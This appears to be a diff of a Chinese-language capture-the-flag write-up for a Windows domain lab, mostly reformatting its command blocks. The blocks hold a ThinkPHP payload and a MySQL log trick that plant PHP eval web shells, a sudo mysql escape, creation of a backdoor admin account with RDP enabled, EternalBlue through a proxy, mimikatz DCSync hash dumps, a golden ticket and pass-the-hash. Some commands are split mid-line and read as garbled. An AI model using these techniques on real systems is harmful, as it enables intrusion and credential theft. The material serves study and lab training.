@@ -147,7 +147,8 @@ select '<?php eval($_POST[cmd]);?>';    #一句话木马
 
 连接后可以看到直接是system权限
 
-搜索flag文件，这里我是先到了C:目录下，然后利用dir命令，去搜索相关文件
+搜索flag文件，这里我是先到了C:
+目录下，然后利用dir命令，去搜索相关文件
 
 dir /s flag
 
@@ -197,7 +198,9 @@ proxychains msfconsole    #msfconsole的流量都走proxychains的配置
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp_uuid
 set rhost 172.22.1.21
-set proxies socks5:175.**.**.**:19999 #你也可以在这一步设置代理
+set proxies socks5:
+175.**.**.**:
+19999 #你也可以在这一步设置代理
 exploit 
 
 当然噢，proxychains的提示可以关的，我这里没关
@@ -257,132 +260,49 @@ Kerberos认证的大概流程：
 
 ```
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls
-```
-
-
-
-```
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo "<?php phpinfo();?>" > info.php
-```
-
-
-
-```
 _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php eval($_POST[aaa]); ?>' > shell.php
-```
-
-
-
-```
 system    (!) Execute a system shell command.    #help里的内容，能看到可以执行命令
 mysql> ! ls    #mysql里执行ls
-```
-
-
-
-```
 sudo mysql -e '! [命令]'
-```
-
-
-
-```
 find / -name "flag"    #/表示在/目录下，搜索所有文件；-name表示搜索文件名；"flag"表示搜索文件为flag的文件
-```
-
-
-
-```
 sudo mysql -e '! chmod 777 fscan'    #设置权限
 ./fscan -h 172.22.1.0/24 -o w3.txt    #扫描并输出
-```
-
-
-
-```
 dirsearch -u http://172.22.1.18
-```
-
-
-
-```
 set global general_log = "ON";     #开启日志
 set global general_log_file='C:/phpStudy/PHPTutorial/WWW/111.php';    #设置日志保存目录
 select '<?php eval($_POST[cmd]);?>';    #一句话木马
-```
-
-
-
-```
 dir /s flag
-```
-
-
-
-```
 net user [用户名] [密码] /add  #添加用户
 net localgroup Administrators [用户名] /add  #将用户添加至Administratos这个用户组
 REG ADD HKLMSYSTEMCurrentControlSetControlTerminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  #通过写入注册表，将3389，即远程连接开启
-```
-
-
-
-```
 vim /etc/proxychains.conf    #编辑文件
-```
-
-
-
-```
 [ProxyList]
 socks5 175.**.**.** 19999
-```
-
-
-
-```
 proxychains msfconsole    #msfconsole的流量都走proxychains的配置
-```
-
-
-
-```
 use exploit/windows/smb/ms17_010_eternalblue
 set payload windows/x64/meterpreter/bind_tcp_uuid
 set rhost 172.22.1.21
-set proxies socks5:175.**.**.**:19999 #你也可以在这一步设置代理
+set proxies socks5:
+175.**.**.**:
+19999 #你也可以在这一步设置代理
 exploit
-```
-
-
-
-```
 load kiwi    #加载
-kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv    #读取域内所有用户的Hash
-```
-
-
-
-```
-kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /user:krbtgt    #导出域内用户哈希
-```
-
-
-
-```
-kiwi_cmd kerberos::golden /user:administrator /domain:xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:fb812eea13a18b7fcdb8e6d67ddc205b /ptt    #导入黄金票据
-```
-
-
-
-```
+kiwi_cmd lsadump::
+dcsync /domain:
+xiaorang.lab /all /csv    #读取域内所有用户的Hash
+kiwi_cmd lsadump::
+dcsync /domain:
+xiaorang.lab /user:
+krbtgt    #导出域内用户哈希
+kiwi_cmd kerberos::
+golden /user:
+administrator /domain:
+xiaorang.lab /sid:S-1-5-21-314492864-3856862959-4045974917-502 /krbtgt:
+fb812eea13a18b7fcdb8e6d67ddc205b /ptt    #导入黄金票据
 python wmiexec.py -hashes [LM Hash]:[NTLM Hash] [域名]/[用户名]@[IP] "[命令]"
-```
-
-
-
-```
-python wmiexec.py -hashes :10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 "type UsersAdministratorflagflag03.txt"
+python wmiexec.py -hashes :
+10cf89a850fb1cdbe6bb432b859164c8 xiaorang/administrator@172.22.1.2 "type UsersAdministratorflagflag03.txt"
 ```
 
 
